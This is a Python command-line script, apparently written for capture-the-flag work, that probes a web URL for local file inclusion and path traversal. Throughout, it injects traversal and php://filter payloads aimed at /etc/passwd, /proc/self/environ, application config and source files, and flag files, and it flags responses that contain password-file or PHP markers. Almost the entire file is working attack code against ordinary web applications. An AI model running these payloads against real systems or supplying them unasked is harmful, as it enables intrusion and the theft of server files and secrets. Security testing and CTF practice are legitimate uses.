#!/usr/bin/env python3
"""Probe common LFI/path traversal files against a URL containing INJECT."""

import argparse
import requests


PATHS = [
    "../../../../etc/passwd",
    "../../../../etc/hosts",
    "../../../../proc/self/environ",
    "../../../../proc/self/cmdline",
    "../../../../proc/self/fd/0",
    "../../../../app/app.py",
    "../../../../app/config.py",
    "../../../../var/www/html/index.php",
    "php://filter/convert.base64-encode/resource=index.php",
    "../../../../flag",
    "../../../../flag.txt",
    "../../../../app/flag.txt",
]


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--url", required=True, help="URL containing INJECT")
    ap.add_argument("--path", action="append", default=[])
    ap.add_argument("--cookie", action="append", default=[])
    args = ap.parse_args()
    cookie = dict(x.split("=", 1) for x in args.cookie)
    for p in args.path or PATHS:
        target = args.url.replace("INJECT", requests.utils.quote(p, safe="/:%"))
        try:
            r = requests.get(target, cookies=cookie, timeout=8)
            body = r.text[:180].replace("\n", "\\n")
            interesting = any(x in r.text.lower() for x in ["root:x:", "flag{", "ctf{", "<?php", "import "])
            print(f"{p}\tstatus={r.status_code}\tlen={len(r.text)}\tinteresting={interesting}\t{body}")
        except requests.RequestException as e:
            print(f"{p}\tERROR\t{e}")


if __name__ == "__main__":
    main()

